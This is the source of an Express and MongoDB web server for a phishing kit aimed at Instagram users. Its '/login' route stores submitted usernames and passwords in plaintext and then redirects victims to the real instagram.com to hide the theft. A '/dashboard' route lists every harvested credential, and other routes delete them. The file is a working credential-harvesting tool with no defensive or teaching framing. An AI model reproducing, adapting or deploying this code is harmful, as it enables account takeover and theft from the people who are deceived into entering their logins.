require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const app = express();

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));
app.set('view engine', 'ejs');

// MongoDB Connection
if (!process.env.MONGO_URI) {
    console.error('Error: MONGO_URI is not defined in the environment variables.');
    process.exit(1);
}

mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.error('MongoDB connection error:', err));

// Schema and Model
const userSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true }
});
const User = mongoose.model('User', userSchema);

// Routes

// Render Home Page with Clean Form
app.get('/', (req, res) => {
    res.render('index'); // `index.ejs` file will always render a clean form
});

// Handle Form Submission and Redirect to Instagram
app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    try {
        const newUser = new User({ username, password });
        await newUser.save();
        
        res.redirect('https://www.instagram.com/'); // Redirect to Instagram
    } catch (err) {
        console.error('Error saving user:', err);
        res.status(500).send('Internal Server Error');
    }
});


// Render Dashboard with All Saved Users
app.get('/dashboard', async (req, res) => {
    try {
        const users = await User.find({}); // Fetch all users from the database
        res.render('dash', { users }); // Pass users to `dash.ejs`
    } catch (err) {
        console.error('Error fetching users:', err);
        res.status(500).send('Internal Server Error');
    }
});

// Delete One User by ID
app.post('/delete/:id', async (req, res) => {
    const userId = req.params.id;

    try {
        await User.findByIdAndDelete(userId);
        res.redirect('/dashboard');
    } catch (err) {
        console.error('Error deleting user:', err);
        res.status(500).send('Internal Server Error');
    }
});

// Delete All Users
app.post('/delete-all', async (req, res) => {
    try {
        await User.deleteMany({});
        res.redirect('/dashboard');
    } catch (err) {
        console.error('Error deleting all users:', err);
        res.status(500).send('Internal Server Error');
    }
});

// Start Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
